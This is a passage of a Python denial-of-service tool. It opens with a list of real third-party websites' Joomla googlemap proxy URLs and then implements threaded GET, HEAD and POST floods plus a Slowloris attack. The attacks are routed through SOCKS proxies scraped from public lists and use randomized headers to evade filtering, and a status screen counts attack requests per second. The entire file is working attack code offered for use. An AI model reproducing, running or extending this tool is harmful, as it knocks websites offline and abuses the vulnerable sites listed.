     'http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=',
     'http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=',
     'http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=',
     'http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=',
     'http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=',
     'http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=',
]
ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))
			th.setDaemon(True)
			th.start()

def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
	return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))

def GenReqHeader(method):
	global data
	header = ""
	if method == "get" or method == "head":
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		accept = Choice(acceptall)
		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
		useragent = "User-Agent: " + getuseragent() + "\r\n"
		header =  referer + useragent + accept + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: http://"+ target + path + "\r\n"
		user_agent = "User-Agent: " + getuseragent() + "\r\n"
		accept = Choice(acceptall)
		if mode2 != "y":# You can enable customize data
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Please enter the correct option")
			ans = ""
			continue
	return ans

def CheckerOption():
	global proxies
	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
	if N == 'y' or N == "" :
		downloadsocks(choice)
	else:
		pass
	if choice == "4":
		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
		if out_file == '':
			out_file = str("socks5.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new one.")
		sys.exit(1)
	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("> Delay of socks(seconds, default=5):"))
		if ms == "":
			ms = int(5)
		else :
			try:
				ms = int(ms)
			except :
				ms = float(ms)
		check_socks(ms)

def SetupIndDict():
	global ind_dict
	for proxy in proxies:
		ind_dict[proxy.strip()] = 0

def OutputToScreen(ind_rlock):
	global ind_dict
	i = 0
	sp_char = ["|","/","-","\\"]
	while 1:
		if i > 3:
			i = 0
		print("{:^70}".format("Proxies attacking status"))
		print("{:^70}".format("IP:PORT   <->   RPS    "))
		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
		ind_rlock.acquire()
		top_num = 0
		top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
		if len(top10) > 10:
			top_num = 10
		else:
			top_num = len(top10)
		for num in range(top_num):
			top = "none"
			rps = 0
			if len(ind_dict) != 0:
				top = top10[num]
				rps = ind_dict[top]
				ind_dict[top] = 0
			print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
		total = 0
		for k,v in ind_dict.items():
			total = total + v
			ind_dict[k] = 0
		ind_rlock.release()
		print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
		i+=1
		time.sleep(1)
		print("\n"*100)

def cc(event,socks_type,ind_rlock):
	global ind_dict
	header = GenReqHeader("get")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = get_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()

def head(event,socks_type,ind_rlock):#HEAD MODE
	global ind_dict
	header = GenReqHeader("head")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = head_host + header
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break#   This part will jump to dirty fix
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:#dirty fix
			s.close()

def post(event,socks_type,ind_rlock):
	global ind_dict
	request = GenReqHeader("post")
	proxy = Choice(proxies).strip().split(":")
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for n in range(multiple+1):
					sent = s.send(str.encode(request))
					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()

socket_list=[]
def slow(conn,socks_type):
	proxy = Choice(proxies).strip().split(":")
	for _ in range(conn):
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(1)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			
			socket_list.append(s)
			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
	while True:
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				s.close()
				socket_list.remove(s)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
		proxy = Choice(proxies).strip().split(":")
		for _ in range(conn - len(socket_list)):
			try:
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
				s.settimeout(1)
				s.connect((str(target), int(port)))
				if int(port) == 443:
					ctx = ssl.SSLContext()
					s = ctx.wrap_socket(s,server_hostname=target)
				s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
				if cookies != "":
					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
				s.send(("Connection:keep-alive").encode("utf-8"))
				socket_list.append(s)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				proxy = Choice(proxies).strip().split(":")
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
				pass
nums = 0
def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by BlueSkyXN
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):#Coded by BlueSkyXN
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if choice == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if choice == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	ans = input("> Do u want to save them in a file? (y/n, default=y)")
	if ans == "y" or ans == "":
		if choice == "4":
			with open("socks4.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> They are saved in socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> They are saved in socks5.txt.")
			
def check_list(socks_file):
	print("> Checking list")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def downloadsocks(choice):
	if choice == "4":
		f = open("socks4.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				out_file = open("socks4.txt","a")
				out_file.write(proxies)
				out_file.close()
		except:
			pass
		print("> Have already downloaded socks4 list as socks4.txt")
	if choice == "5":
		f = open("socks5.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		print("> Have already downloaded socks5 list as socks5.txt")
def prevent():
	if '.gov' in url :
		print("> You can't attack .gov website!")
		exit()
	
def main():
	global multiple
	global choice
	global data
	global mode2
	global cookies
	global brute
	global url
	print("> Mode: [cc/post/head/slow/check]")
	mode = InputOption("> Choose Your Mode (default=cc) :",["cc","post","head","slow","check"],"cc")
	url = str(input("> Input the target url:")).strip()
	prevent()
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("Plese input the cookies:")).strip()
	choice = InputOption("> Choose your socks mode(4/5, default=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		CheckerOption()
		print("> End of process")
		return
	if mode == "slow":	
		thread_num = str(input("> Connections(default=400):"))
	else:
		thread_num = str(input("> Threads(default=400):"))
	if thread_num == "":
		thread_num = int(400)
	else:
		try:
			thread_num = int(thread_num)
		except:
			sys.exit("Error thread number")
	CheckerOption()
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new one.")
		return
	ind_rlock = threading.RLock()
	if mode == "slow":
		input("Press Enter to continue.")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input("> Input the Magnification(default=100):"))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
		elif brute == "n":
			brute = False
		event = threading.Event()
		print("> Building threads...")
		SetupIndDict()
		build_threads(mode,thread_num,event,socks_type,ind_rlock)
		event.clear()
		input("Press Enter to continue.")
		event.set()
		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
	while True:
		try:
			time.sleep(0.1)
		except KeyboardInterrupt:
			break
	

if __name__ == "__main__":
	main()
